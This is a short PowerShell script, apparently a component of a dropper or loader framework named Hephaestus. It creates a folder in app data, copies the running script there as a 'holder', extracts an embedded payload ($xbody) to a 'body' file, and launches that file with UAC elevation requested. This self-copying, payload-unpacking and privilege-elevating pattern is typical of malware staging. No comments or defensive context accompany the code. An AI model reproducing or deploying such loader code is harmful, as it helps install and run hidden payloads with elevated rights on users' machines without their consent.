. ./utils.ps1
. ./consts_autoextract.ps1

function checkFolder {
    $appDataFolder = Get-HephaestusFolder
    if (-not (Test-Path -Path $appDataFolder))
    {
        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
    }
}

function extract_holder()
{
    $curScript = Get-ScriptPath
    $holderFile = Get-HolderPath

    $pathOrData = $MyInvocation.MyCommand.Definition
    if ($pathOrData -like "IsDebug")
    {
        [System.IO.File]::WriteAllText($holderFile, $pathOrData)
    } 
    else 
    {
        Copy-Item -Path $curScript -Destination $holderFile -Force
    } 
}

function extract_body()
{
    $holderBodyFile = Get-BodyPath
    if (-not (Test-Path -Path $holderBodyFile))
    {
        ExtractEmbedding -inContent $xbody -outFile $holderBodyFile
    }
}

function do_holder 
{
    checkFolder
    extract_holder
    extract_body
    RunMe -script (Get-BodyPath) -arg "" -uac $true
}

